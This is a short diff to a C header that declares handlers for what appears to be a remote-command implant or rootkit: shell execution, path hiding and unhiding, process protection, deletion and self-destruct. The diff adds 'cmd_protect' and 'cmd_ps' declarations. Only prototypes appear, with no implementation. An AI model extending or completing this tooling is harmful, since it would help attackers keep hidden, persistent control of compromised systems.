@@ -1,6 +1,7 @@
 #pragma once
 
 #include "job.h"
+
 #include <stdbool.h>
 #include <stdint.h>
 
@@ -20,13 +21,15 @@ char *cmd_shell(job_t *job);
 char *cmd_chdir(job_t *job);
 char *cmd_hide(job_t *job);
 char *cmd_destruct(job_t *job);
+char *cmd_protect(job_t *job);
 char *cmd_unhide(job_t *job);
 char *cmd_delete(job_t *job);
 char *cmd_run(job_t *job);
+char *cmd_ps(job_t *job);
 
 // command helpers
+bool protect_pid(pid_t pid);
 bool hide_path(char *path);
 bool unhide_path(char *path);
 bool is_path_hidden(char *path);
-bool protect_pid(pid_t pid);
 bool load_hidden();
